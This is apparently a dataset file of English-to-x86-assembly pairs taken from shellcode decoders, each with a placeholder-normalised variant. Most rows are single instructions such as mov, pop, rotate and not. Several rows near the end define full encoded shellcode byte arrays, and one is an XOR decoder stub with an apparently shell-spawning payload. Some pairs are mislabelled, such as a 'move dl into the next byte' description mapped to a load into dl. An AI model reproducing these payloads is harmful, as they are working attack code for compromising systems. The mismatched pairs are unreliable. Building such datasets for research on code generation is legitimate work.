move dl into the byte in esi,move dl byte var0,"mov byte [esi] , dl","mov byte [var0] , dl"
move bl into the byte in esi+ecx,move var0 byte esi+ecx,"mov byte [esi+ecx] , bl","mov byte [var1] , var0"
move cl into the byte in esp+eax+1,move cl byte esp+eax+1,"mov byte [esp+eax+1] , cl","mov byte [var0] , cl"
move bh into the byte in esp+eax+2,move bh byte esp+eax+2,"mov byte [esp+eax+2] , bh","mov byte [var0] , bh"
move bl into the byte in esp+eax+3,move var0 byte esp+eax+3,"mov byte [esp+eax+3] , bl","mov byte [var1] , var0"
move ch into the byte in esp+eax,move var0 byte esp+eax,"mov byte [esp+eax] , ch","mov byte [var1] , var0"
move bl into the byte in edx + eax,move var0 byte edx + eax,"mov byte [edx+eax] , bl","mov byte [edx+eax] , var0"
save the byte in esi+edx+4 in ch,save byte var0 var1,"mov ch , byte [esi+edx+4]","mov var1 , byte [var0]"
move 10 into the first byte of the counter,move 10 first byte counter,"mov cl , 10","mov cl , 10"
move 13 to cl,move 13 cl,"mov cl , 13","mov cl , 13"
put the contents of the al into the cl register,put contents al cl register,"mov cl , al","mov cl , al"
move the byte in eax to cl,move byte var0 cl,"mov cl , byte [eax]","mov cl , byte [var0]"
save the byte in esi+edx+3 in cl,save byte var0 cl,"mov cl , byte [esi+edx+3]","mov cl , byte [var0]"
move dl into cl,move dl cl,"mov cl , dl","mov cl , dl"
move the address of esi-1 into dl,move address var0 dl,"mov dl , [esi-1]","mov dl , [var0]"
move the previous byte of the shellcode to dl,move previous byte shellcode dl,"mov dl , [esi-1]","mov dl , [esi-1]"
move the contents of dl into the next byte of the shellcode,move contents dl next byte shellcode,"mov dl , [esi+1]","mov dl , [esi+1]"
move 0x45 to dl,move var0 dl,"mov dl , 0x45","mov dl , var0"
move 0xff to dl,move var0 dl,"mov dl , 0xff","mov dl , var0"
move the byte at address eax+1 to dl,move byte address var0 dl,"mov dl , byte [eax+1]","mov dl , byte [var0]"
move the byte at address eax to dl,move byte address var0 dl,"mov dl , byte [eax]","mov dl , byte [var0]"
move the contents of the address esi+1 into dl,move contents address var0 dl,"mov dl , byte [esi+1]","mov dl , byte [var0]"
move the byte at the address esi+edi+1 into dl,move byte address var0 dl,"mov dl , byte [esi+edi+1]","mov dl , byte [var0]"
put the byte in esi into dl,put byte var0 dl,"mov dl , byte [esi]","mov dl , byte [var0]"
move edi to eax,move var0 var1,"mov eax , edi","mov var1 , var0"
copy the value of ebp to ecx,copy value var0 var1,"mov ecx , ebp","mov var1 , var0"
move 0xaaaa9090 to edi,move var0 var1,"mov edi , 0xaaaa9090","mov var1 , var0"
move the pointer to the shellcode into edi,move pointer shellcode var0,"mov edi , esi","mov var0 , esi"
point edx to the stack pointer,point var0 stack pointer,"mov edx , esp","mov var0 , esp"
move ax into the word in edi,move ax word var0,"mov word [edi] , ax","mov word [var0] , ax"
in the negative function negate dl and increment dl to the next byte,in var0 function negate dl and increment dl next byte,negative : \n not dl \n inc dl,var0 : \n not dl \n inc dl
in next_cycle increment edi by one and jump short to formatting,in var0 increment var1 one and jump short formatting,next_cycle : \n inc edi \n jmp short formatting,var0 : \n inc var1 \n jmp short formatting
not operation of current byte in esi,not operation current byte var0,not byte [esi],not byte [var0]
not_equal label,var0 label,not_equal :,var0 :
notdecode function,var0 function,notdecode :,var0 :
define odd_number,define var0,odd_number :,var0 :
pop the address of the encoded shellcode into esi,pop address encoded shellcode var0,pop esi,pop var0
store the address of the shellcode in esi,store address shellcode var0,pop esi,pop var0
store the pointer to the encoded shellcode in esi,store pointer encoded shellcode var0,pop esi,pop var0
store the shellcode in esi,store shellcode var0,pop esi,pop var0
store the shellcode in esi and move it into cx,store shellcode var0 and move it cx,"pop esi \n mov cx , [esi]","pop var0 \n mov cx , [var0]"
push the encoded shellcode pointer to stack,push encoded shellcode pointer stack,push esi,push esi
push the stack onto esi and move the contents on edi,push stack var0 and move contents var1,"push esi \n mov edi , esi","push var0 \n mov var1 , var0"
returnlabel label,var0 label,returnlabel :,var0 :
left rotate the shellcode by one,left rotate shellcode one,"rol byte [esi] , 0x1","rol byte [esi] , 0x1"
right rotate bl by the contents of cl,right rotate var0 contents cl,"ror bl , cl","ror var0 , cl"
right rotate the shellcode in esi by one,right rotate shellcode var0 one,"ror byte [esi] , 0x1","ror byte [var0] , 0x1"
section text,section text,section . text,section . text
define shellcode_length equal to the size of shellcode,define var0 equal size shellcode,shellcode_length equ $-shellcode,var0 equ $-shellcode
in shellcode_section go to decoder's main,in var0 go decoder's main,shellcode_section \n call decoder,var0 \n call decoder
"define shellcode as the array of bytes 0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88",define shellcode array bytes var0,"shellcode : db 0x0e , 0x3a , 0x94 , 0x12 , 0x12 , 0x12 , 0xb2 , 0x9b , 0x37 , 0xc3 , 0x52 , 0xb6 , 0x9d , 0xa2 , 0xc2 , 0x9d , 0xa4 , 0x1e , 0x9d , 0xa4 , 0xe6 , 0x9d , 0x84 , 0xfa , 0x21 , 0x49 , 0xdc , 0xf8 , 0xc3 , 0x11 , 0x7e , 0xce , 0xb3 , 0x8e , 0x14 , 0xfe , 0xf2 , 0x53 , 0x61 , 0x1f , 0x13 , 0x59 , 0x34 , 0x04 , 0xa4 , 0xa9 , 0x9d , 0xa4 , 0xe2 , 0x9d , 0xdc , 0xce , 0x9d , 0xde , 0xe3 , 0x8a , 0x35 , 0xda , 0x13 , 0x23 , 0xa3 , 0x9d , 0xab , 0xf2 , 0x13 , 0x25 , 0x9d , 0xdb , 0xea , 0x35 , 0xcc , 0xdb , 0x9d , 0xc6 , 0x9d , 0x13 , 0x28 , 0xc3 , 0x11 , 0x7e , 0x53 , 0x61 , 0x1f , 0x13 , 0x59 , 0xca , 0x32 , 0x87 , 0x08 , 0x15 , 0x8f , 0x0a , 0xcd , 0x8f , 0xf6 , 0x87 , 0x36 , 0xaa , 0x9d , 0xaa , 0xf6 , 0x13 , 0x25 , 0xb8 , 0x9d , 0x1e , 0xdd , 0x9d , 0xaa , 0xee , 0x13 , 0x25 , 0x9d , 0x16 , 0x9d , 0x13 , 0x22 , 0x9b , 0xd6 , 0xf6 , 0xf6 , 0xad , 0xad , 0xb3 , 0xab , 0xac , 0xa3 , 0x11 , 0x32 , 0xb1 , 0xb1 , 0xac , 0x9d , 0xe4 , 0x3d , 0x9f , 0xaf , 0xba , 0xc5 , 0xc4 , 0x12 , 0x12 , 0xba , 0x89 , 0x85 , 0xc4 , 0xb1 , 0xa6 , 0xba , 0xde , 0x89 , 0xf8 , 0x19 , 0x11 , 0x27 , 0x4a , 0x62 , 0x13 , 0x12 , 0x12 , 0xfb , 0x56 , 0xa6 , 0xa2 , 0xba , 0xfb , 0x92 , 0xbd , 0x12 , 0x11 , 0x27 , 0xa2 , 0xa2 , 0xa2 , 0xa2 , 0xd2 , 0xa2 , 0xd2 , 0xa2 , 0xba , 0x3c , 0x21 , 0x31 , 0x32 , 0x11 , 0x27 , 0x69 , 0xbc , 0x17 , 0xba , 0x52 , 0x7a , 0x86 , 0x59 , 0xba , 0x14 , 0x12 , 0x13 , 0x4d , 0x9b , 0x38 , 0xbc , 0xe2 , 0xa8 , 0xa9 , 0xba , 0x6b , 0x77 , 0x86 , 0xb3 , 0x11 , 0x27 , 0x97 , 0x52 , 0x86 , 0x1e , 0x11 , 0xe0 , 0x1a , 0x87 , 0x3e , 0xba , 0x02 , 0x47 , 0x74 , 0xa8 , 0x11 , 0x27 , 0xba , 0xb5 , 0xbf , 0xb6 , 0x12 , 0x9b , 0x35 , 0xa9 , 0xa9 , 0xa9 , 0xc3 , 0x08 , 0xbc , 0xe4 , 0xab , 0xa8 , 0x34 , 0x0f , 0xb8 , 0x59 , 0xd6 , 0xf6 , 0xce , 0x13 , 0x13 , 0x9f , 0xd6 , 0xf6 , 0xe2 , 0x58 , 0x12 , 0xd6 , 0xa6 , 0xa2 , 0xa8 , 0xa8 , 0xa8 , 0xd8 , 0xa8 , 0xe0 , 0xa8 , 0xa8 , 0xa5 , 0xa8 , 0xba , 0x8b , 0x5e , 0xd1 , 0x98 , 0x11 , 0x27 , 0x9b , 0x32 , 0xe0 , 0xa8 , 0xd8 , 0x11 , 0xc2 , 0xba , 0x1a , 0x99 , 0xef , 0xb2 , 0x11 , 0x27 , 0x4d , 0x02 , 0x47 , 0x74 , 0xa8 , 0xba , 0x78 , 0x67 , 0x4f , 0x6f , 0x11 , 0x27 , 0xce , 0x18 , 0x8e , 0x1c , 0x92 , 0x0d , 0x32 , 0x87 , 0x17 , 0x4d , 0xd9 , 0xe5 , 0x84 , 0xc1 , 0xbc , 0x12 , 0xa5 , 0x11 , 0x27 , 0x88","shellcode : db 0x0e , 0x3a , 0x94 , 0x12 , 0x12 , 0x12 , 0xb2 , 0x9b , 0x37 , 0xc3 , 0x52 , 0xb6 , 0x9d , 0xa2 , 0xc2 , 0x9d , 0xa4 , 0x1e , 0x9d , 0xa4 , 0xe6 , 0x9d , 0x84 , 0xfa , 0x21 , 0x49 , 0xdc , 0xf8 , 0xc3 , 0x11 , 0x7e , 0xce , 0xb3 , 0x8e , 0x14 , 0xfe , 0xf2 , 0x53 , 0x61 , 0x1f , 0x13 , 0x59 , 0x34 , 0x04 , 0xa4 , 0xa9 , 0x9d , 0xa4 , 0xe2 , 0x9d , 0xdc , 0xce , 0x9d , 0xde , 0xe3 , 0x8a , 0x35 , 0xda , 0x13 , 0x23 , 0xa3 , 0x9d , 0xab , 0xf2 , 0x13 , 0x25 , 0x9d , 0xdb , 0xea , 0x35 , 0xcc , 0xdb , 0x9d , 0xc6 , 0x9d , 0x13 , 0x28 , 0xc3 , 0x11 , 0x7e , 0x53 , 0x61 , 0x1f , 0x13 , 0x59 , 0xca , 0x32 , 0x87 , 0x08 , 0x15 , 0x8f , 0x0a , 0xcd , 0x8f , 0xf6 , 0x87 , 0x36 , 0xaa , 0x9d , 0xaa , 0xf6 , 0x13 , 0x25 , 0xb8 , 0x9d , 0x1e , 0xdd , 0x9d , 0xaa , 0xee , 0x13 , 0x25 , 0x9d , 0x16 , 0x9d , 0x13 , 0x22 , 0x9b , 0xd6 , 0xf6 , 0xf6 , 0xad , 0xad , 0xb3 , 0xab , 0xac , 0xa3 , 0x11 , 0x32 , 0xb1 , 0xb1 , 0xac , 0x9d , 0xe4 , 0x3d , 0x9f , 0xaf , 0xba , 0xc5 , 0xc4 , 0x12 , 0x12 , 0xba , 0x89 , 0x85 , 0xc4 , 0xb1 , 0xa6 , 0xba , 0xde , 0x89 , 0xf8 , 0x19 , 0x11 , 0x27 , 0x4a , 0x62 , 0x13 , 0x12 , 0x12 , 0xfb , 0x56 , 0xa6 , 0xa2 , 0xba , 0xfb , 0x92 , 0xbd , 0x12 , 0x11 , 0x27 , 0xa2 , 0xa2 , 0xa2 , 0xa2 , 0xd2 , 0xa2 , 0xd2 , 0xa2 , 0xba , 0x3c , 0x21 , 0x31 , 0x32 , 0x11 , 0x27 , 0x69 , 0xbc , 0x17 , 0xba , 0x52 , 0x7a , 0x86 , 0x59 , 0xba , 0x14 , 0x12 , 0x13 , 0x4d , 0x9b , 0x38 , 0xbc , 0xe2 , 0xa8 , 0xa9 , 0xba , 0x6b , 0x77 , 0x86 , 0xb3 , 0x11 , 0x27 , 0x97 , 0x52 , 0x86 , 0x1e , 0x11 , 0xe0 , 0x1a , 0x87 , 0x3e , 0xba , 0x02 , 0x47 , 0x74 , 0xa8 , 0x11 , 0x27 , 0xba , 0xb5 , 0xbf , 0xb6 , 0x12 , 0x9b , 0x35 , 0xa9 , 0xa9 , 0xa9 , 0xc3 , 0x08 , 0xbc , 0xe4 , 0xab , 0xa8 , 0x34 , 0x0f , 0xb8 , 0x59 , 0xd6 , 0xf6 , 0xce , 0x13 , 0x13 , 0x9f , 0xd6 , 0xf6 , 0xe2 , 0x58 , 0x12 , 0xd6 , 0xa6 , 0xa2 , 0xa8 , 0xa8 , 0xa8 , 0xd8 , 0xa8 , 0xe0 , 0xa8 , 0xa8 , 0xa5 , 0xa8 , 0xba , 0x8b , 0x5e , 0xd1 , 0x98 , 0x11 , 0x27 , 0x9b , 0x32 , 0xe0 , 0xa8 , 0xd8 , 0x11 , 0xc2 , 0xba , 0x1a , 0x99 , 0xef , 0xb2 , 0x11 , 0x27 , 0x4d , 0x02 , 0x47 , 0x74 , 0xa8 , 0xba , 0x78 , 0x67 , 0x4f , 0x6f , 0x11 , 0x27 , 0xce , 0x18 , 0x8e , 0x1c , 0x92 , 0x0d , 0x32 , 0x87 , 0x17 , 0x4d , 0xd9 , 0xe5 , 0x84 , 0xc1 , 0xbc , 0x12 , 0xa5 , 0x11 , 0x27 , 0x88"
"define shellcode as array of bytes 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87",define shellcode array bytes var0,"shellcode : db 0x18 , 0x38 , 0xc7 , 0x57 , 0x6f , 0x36 , 0x36 , 0x7a , 0x6f , 0x6f , 0x36 , 0x69 , 0x70 , 0x75 , 0x90 , 0xea , 0x38 , 0xd0 , 0x90 , 0xd1 , 0x71 , 0x12 , 0x5f , 0xd4 , 0x87","shellcode : db 0x18 , 0x38 , 0xc7 , 0x57 , 0x6f , 0x36 , 0x36 , 0x7a , 0x6f , 0x6f , 0x36 , 0x69 , 0x70 , 0x75 , 0x90 , 0xea , 0x38 , 0xd0 , 0x90 , 0xd1 , 0x71 , 0x12 , 0x5f , 0xd4 , 0x87"
"shellcode contains the bytes 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4",shellcode contains bytes var0,"shellcode : db 0x31 , 0xc0 , 0x31 , 0xdb , 0x31 , 0xc9 , 0x31 , 0xd2 , 0xb2 , 0xa4 , 0xeb , 0x1f , 0x5e , 0x8d , 0x3e , 0x8a , 0x1c , 0x0f , 0x88 , 0xdf , 0x88 , 0xd0 , 0x30 , 0xd8 , 0x74 , 0x16 , 0x66 , 0x8b , 0x44 , 0x0f , 0x01 , 0x66 , 0x31 , 0xd8 , 0x66 , 0x89 , 0x07 , 0x41 , 0x8d , 0x7f , 0x02 , 0xeb , 0xe4 , 0xe8 , 0xdc , 0xff , 0xff , 0xff , 0x7d , 0x4c , 0xa6 , 0x09 , 0xfe , 0xea , 0xd8 , 0x8b , 0x9b , 0x0c , 0x5f , 0x66 , 0x30 , 0x32 , 0xb9 , 0x07 , 0xe6 , 0xb7 , 0x0f , 0x69 , 0xc2 , 0xab , 0x2b , 0xf0 , 0x3e , 0x60 , 0x6c , 0xea , 0x82 , 0xe8 , 0x63 , 0x63 , 0x72 , 0x68 , 0x34 , 0x02 , 0xeb , 0xfb , 0xba , 0xef , 0xbf , 0x66 , 0xf4 , 0x15 , 0x9e , 0xbb , 0xdd , 0xe3 , 0x73 , 0xbe , 0xf3 , 0xbb , 0x32 , 0xfa , 0xeb , 0xef , 0x58 , 0x20 , 0x24 , 0x90 , 0xe3 , 0x85 , 0x2e , 0x64 , 0xe4 , 0x27 , 0x59 , 0xe9 , 0x3f , 0xee , 0x23 , 0x6e , 0x63 , 0xf0 , 0x3a , 0x47 , 0x2d , 0x78 , 0x68 , 0x30 , 0xa5 , 0x66 , 0xe6 , 0x2f , 0x69 , 0x10 , 0x91 , 0xfa , 0x92 , 0xd5 , 0x3e , 0x11 , 0x4d , 0xf4 , 0x9c , 0x9c , 0x16 , 0x39 , 0x74 , 0xa0 , 0xc9 , 0xce , 0xd2 , 0x5b , 0x31 , 0x5c , 0x0c , 0x0f , 0xfb , 0x72 , 0x1a , 0xb6 , 0x06 , 0xbd , 0xd1 , 0x1c , 0x51 , 0xa4","shellcode : db 0x31 , 0xc0 , 0x31 , 0xdb , 0x31 , 0xc9 , 0x31 , 0xd2 , 0xb2 , 0xa4 , 0xeb , 0x1f , 0x5e , 0x8d , 0x3e , 0x8a , 0x1c , 0x0f , 0x88 , 0xdf , 0x88 , 0xd0 , 0x30 , 0xd8 , 0x74 , 0x16 , 0x66 , 0x8b , 0x44 , 0x0f , 0x01 , 0x66 , 0x31 , 0xd8 , 0x66 , 0x89 , 0x07 , 0x41 , 0x8d , 0x7f , 0x02 , 0xeb , 0xe4 , 0xe8 , 0xdc , 0xff , 0xff , 0xff , 0x7d , 0x4c , 0xa6 , 0x09 , 0xfe , 0xea , 0xd8 , 0x8b , 0x9b , 0x0c , 0x5f , 0x66 , 0x30 , 0x32 , 0xb9 , 0x07 , 0xe6 , 0xb7 , 0x0f , 0x69 , 0xc2 , 0xab , 0x2b , 0xf0 , 0x3e , 0x60 , 0x6c , 0xea , 0x82 , 0xe8 , 0x63 , 0x63 , 0x72 , 0x68 , 0x34 , 0x02 , 0xeb , 0xfb , 0xba , 0xef , 0xbf , 0x66 , 0xf4 , 0x15 , 0x9e , 0xbb , 0xdd , 0xe3 , 0x73 , 0xbe , 0xf3 , 0xbb , 0x32 , 0xfa , 0xeb , 0xef , 0x58 , 0x20 , 0x24 , 0x90 , 0xe3 , 0x85 , 0x2e , 0x64 , 0xe4 , 0x27 , 0x59 , 0xe9 , 0x3f , 0xee , 0x23 , 0x6e , 0x63 , 0xf0 , 0x3a , 0x47 , 0x2d , 0x78 , 0x68 , 0x30 , 0xa5 , 0x66 , 0xe6 , 0x2f , 0x69 , 0x10 , 0x91 , 0xfa , 0x92 , 0xd5 , 0x3e , 0x11 , 0x4d , 0xf4 , 0x9c , 0x9c , 0x16 , 0x39 , 0x74 , 0xa0 , 0xc9 , 0xce , 0xd2 , 0x5b , 0x31 , 0x5c , 0x0c , 0x0f , 0xfb , 0x72 , 0x1a , 0xb6 , 0x06 , 0xbd , 0xd1 , 0x1c , 0x51 , 0xa4"
"define the array of bytes shellcode 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d",define array bytes shellcode var0,"shellcode : db 0x3e , 0xcd , 0x5d , 0x96 , 0xef , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x6f , 0x76 , 0x7b , 0x96 , 0xf0 , 0x5d , 0xbd , 0x18 , 0xda , 0x8d",shellcode : db var0
"define shellcode as array of bytes 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01",define shellcode array bytes var0,"shellcode : db 0x62 , 0x60 , 0xa0 , 0x34 , 0x5e , 0x97 , 0xe6 , 0x34 , 0xd0 , 0x97 , 0xc4 , 0xb4 , 0xdc , 0xc4 , 0xc7 , 0x28 , 0x13 , 0x71 , 0xa6 , 0xc4 , 0xc3 , 0x58 , 0x16 , 0xe6 , 0x01","shellcode : db 0x62 , 0x60 , 0xa0 , 0x34 , 0x5e , 0x97 , 0xe6 , 0x34 , 0xd0 , 0x97 , 0xc4 , 0xb4 , 0xdc , 0xc4 , 0xc7 , 0x28 , 0x13 , 0x71 , 0xa6 , 0xc4 , 0xc3 , 0x58 , 0x16 , 0xe6 , 0x01"
"shellcode is array of bytes 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa",shellcode array bytes var0,"shellcode : db 0xbb , 0xec , 0x73 , 0xcc , 0x3f , 0x9d , 0xbb , 0x8d , 0x51 , 0xbb , 0xb5 , 0x1b , 0xbb , 0xb3 , 0x22 , 0xbb , 0xf2 , 0x79 , 0xbb , 0xae , 0x8e , 0xbb , 0xb5 , 0x61 , 0xbb , 0xb5 , 0x3d , 0xbb , 0xf2 , 0x6e , 0xbb , 0xf2 , 0x9f , 0xbb , 0xbf , 0x10 , 0xbb , 0xb4 , 0x89 , 0xcc , 0x76 , 0x2d , 0xcc , 0x1c , 0x2f , 0xbb , 0x8d , 0x91 , 0xcc , 0x76 , 0x7e , 0xcc , 0x1d , 0x92 , 0xbb , 0x8e , 0x80 , 0xcc , 0x76 , 0x7b , 0xcc , 0x1e , 0xa7 , 0xcc , 0x4f , 0x7f , 0xbb , 0xd6 , 0x2b , 0xcc , 0x32 , 0x24 , 0xcc , 0x7f , 0x37 , 0xaa","shellcode : db 0xbb , 0xec , 0x73 , 0xcc , 0x3f , 0x9d , 0xbb , 0x8d , 0x51 , 0xbb , 0xb5 , 0x1b , 0xbb , 0xb3 , 0x22 , 0xbb , 0xf2 , 0x79 , 0xbb , 0xae , 0x8e , 0xbb , 0xb5 , 0x61 , 0xbb , 0xb5 , 0x3d , 0xbb , 0xf2 , 0x6e , 0xbb , 0xf2 , 0x9f , 0xbb , 0xbf , 0x10 , 0xbb , 0xb4 , 0x89 , 0xcc , 0x76 , 0x2d , 0xcc , 0x1c , 0x2f , 0xbb , 0x8d , 0x91 , 0xcc , 0x76 , 0x7e , 0xcc , 0x1d , 0x92 , 0xbb , 0x8e , 0x80 , 0xcc , 0x76 , 0x7b , 0xcc , 0x1e , 0xa7 , 0xcc , 0x4f , 0x7f , 0xbb , 0xd6 , 0x2b , 0xcc , 0x32 , 0x24 , 0xcc , 0x7f , 0x37 , 0xaa"
"shellcode is an array of bytes 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb",shellcode array bytes var0,"shellcode : db 0xc6 , 0x02 , 0x80 , 0x01 , 0x81 , 0x03 , 0xd1 , 0x01 , 0xbe , 0x02 , 0x5f , 0x01 , 0x98 , 0x03 , 0x1c , 0x06 , 0x60 , 0x08 , 0xf6 , 0x04 , 0xc5 , 0x01 , 0x92 , 0x04 , 0x30 , 0x07 , 0x64 , 0x06 , 0x3a , 0x04 , 0x58 , 0x08 , 0x4f , 0x03 , 0x59 , 0x05 , 0xd2 , 0x06 , 0x81 , 0x08 , 0x1a , 0x04 , 0x5f , 0x07 , 0x03 , 0x08 , 0xd8 , 0x04 , 0x0c , 0x04 , 0xbb , 0xbb","shellcode : db 0xc6 , 0x02 , 0x80 , 0x01 , 0x81 , 0x03 , 0xd1 , 0x01 , 0xbe , 0x02 , 0x5f , 0x01 , 0x98 , 0x03 , 0x1c , 0x06 , 0x60 , 0x08 , 0xf6 , 0x04 , 0xc5 , 0x01 , 0x92 , 0x04 , 0x30 , 0x07 , 0x64 , 0x06 , 0x3a , 0x04 , 0x58 , 0x08 , 0x4f , 0x03 , 0x59 , 0x05 , 0xd2 , 0x06 , 0x81 , 0x08 , 0x1a , 0x04 , 0x5f , 0x07 , 0x03 , 0x08 , 0xd8 , 0x04 , 0x0c , 0x04 , 0xbb , 0xbb"
"define the array of bytes shellcode and initialize it to 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a",define array bytes shellcode and initialize it var0,"shellcode : db 0xeb , 0x0d , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0x80 , 0x36 , 0xaa , 0x46 , 0xe2 , 0xfa , 0xeb , 0x05 , 0xe8 , 0xee , 0xff , 0xff , 0xff , 0x9b , 0x6a , 0xfa , 0xc2 , 0x85 , 0x85 , 0xd9 , 0xc2 , 0xc2 , 0x85 , 0xc8 , 0xc3 , 0xc4 , 0x23 , 0x49 , 0xfa , 0x23 , 0x48 , 0xf9 , 0x23 , 0x4b , 0x1a , 0xa1 , 0x67 , 0x2a","shellcode : db 0xeb , 0x0d , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0x80 , 0x36 , 0xaa , 0x46 , 0xe2 , 0xfa , 0xeb , 0x05 , 0xe8 , 0xee , 0xff , 0xff , 0xff , 0x9b , 0x6a , 0xfa , 0xc2 , 0x85 , 0x85 , 0xd9 , 0xc2 , 0xc2 , 0x85 , 0xc8 , 0xc3 , 0xc4 , 0x23 , 0x49 , 0xfa , 0x23 , 0x48 , 0xf9 , 0x23 , 0x4b , 0x1a , 0xa1 , 0x67 , 0x2a"
